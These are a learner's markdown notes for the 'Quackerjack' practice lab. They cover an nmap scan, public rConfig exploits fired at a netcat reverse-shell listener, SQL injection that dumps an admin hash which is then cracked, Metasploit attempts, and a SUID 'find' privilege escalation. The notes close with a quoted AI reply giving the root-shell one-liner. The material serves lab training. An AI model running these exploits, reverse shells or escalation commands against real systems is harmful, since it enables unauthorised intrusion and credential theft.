	# notes - quackerjack

In this lab, you will exploit rConfig to gain remote code execution. You will then elevate your privileges through a dangerous SUID find utility and extend your access using simple C code to launch a reverse shell. This exercise enhances your skills in exploiting vulnerabilities and privilege escalation techniques.

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial QUACKERJACK
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 19:22 +0000
Nmap scan report for QUACKERJACK (192.168.51.57)
Host is up (0.00067s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.51
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: 400 Bad Request
Service Info: OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2026-04-07T15:22:56-04:00
| smb2-time: 
|   date: 2026-04-07T19:22:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.19 seconds
```


rconfig time.

https://QUACKERJACK:8081

rConfig Version 3.9.4   © rConfig 2015 - 2026

```bash
searchsploit rconfig
# rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution | php/webapps/48261.py

cp /usr/share/exploitdb/exploits/php/webapps/48261.py ./

# edit requests to ignore SSL
nano 48261.py

# to catch rev shell
nc -nvlp 4444

python3 48261.py https://QUACKERJACK:8081 192.168.49.67 4444

# $ python3  rconfig_root_RCE_unauth_final.py http://1.1.1.1 1.1.1.2 3334

# ssl errors
```

let's try this.

https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2019-19509.py

https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2020-10220.py

```bash
# to get username and password
wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2020-10220.py

# nano edit the file and add this to bypass SSL
# request.verify = False
nano rconfig_CVE-2020-10220.py

python rconfig_CVE-2020-10220.py https://QUACKERJACK:8081/


<<EOF

output:
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://QUACKERJACK:8081//commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
Maybe no more information ?
Maybe no more information ?
toljscxnuq:764:21232f297a57a5a743894a0e4a801fc3
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Done


EOF
```


we can crack the password

`admin:1:dc40b85276a1f4d7cb35f154236aa1b2`

https://md5.gromweb.com/?md5=dc40b85276a1f4d7cb35f154236aa1b2

`admin:abgrtyu`

```bash
# to get rce with our stolen login
wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2019-19509.py

# in separate terminal
ip a
nc -nvlp 4444

# edit the file and add this to bypass SSL
# request.verify = False
code-oss rconfig_CVE-2019-19509.py

python rconfig_CVE-2019-19509.py https://quackerjack:8081 admin abgrtyu 192.168.49.67 4444
```


searchsploit rconfig 

let's search again.

```bash
msfconsole

search rconfig
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

set PASSWORD abgrtyu
set USERNAME admin
set RHOSTS quackerjack
set RPORT 8081

run 
#fails

use exploit/unix/webapp/rconfig_install_cmd_exec

set LHOST 192.168.49.67

set RHOSTS quackerjack
set RPORT 8081

```


I'm stuck. let's go to a guide.

https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/quackerjack


https://www.exploit-db.com/exploits/47982


```bash
cp /usr/share/exploitdb/exploits/php/webapps/47982.py ./

ip a
nc -nvlp 80

# make request.verify = False
# request = requests.session()
# request.verify = False
nano 47982.py

python 47982.py https://QUACKERJACK:8081/ admin abgrtyu 192.168.49.67 80

```

we have non-root shell!!! We needed to lower the port number for some reason.

stabilize.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


> "You will then elevate your privileges through a dangerous SUID find utility and extend your access using simple C code to launch a reverse shell. "

okay. SUID.

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap

<<EOF
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
EOF
```

so, `/usr/bin/find`, ...

```sh
strings /usr/bin/find

<<EOF
/etc/mtab
proc
subfs
kernfs
none
bind
smbfs
cifs
invalid argument %s for %s
ambiguous argument %s for %s
Valid arguments are:
  - %s
, %s
cycle-check.c
state->magic == 9827862
cycle_check
/usr/lib64
ASCII
CHARSETALIASDIR
%50s %50s
mbuiter_multi_next
unlabeled
../fd
/proc/self/fd/%d/%s
;*3$"
find.debug
7zXZ
nbKM
WdNS

EOF
```

claude sez

● You've got a non-root shell and found /usr/bin/find has the SUID bit set. The lab description says to use find for privesc.

Next step: exploit SUID find via GTFOBins                                                                                     

    find . -exec /bin/sh -p \; -quit


 The -p flag keeps the elevated privileges (doesn't drop SUID). This should give you a root shell.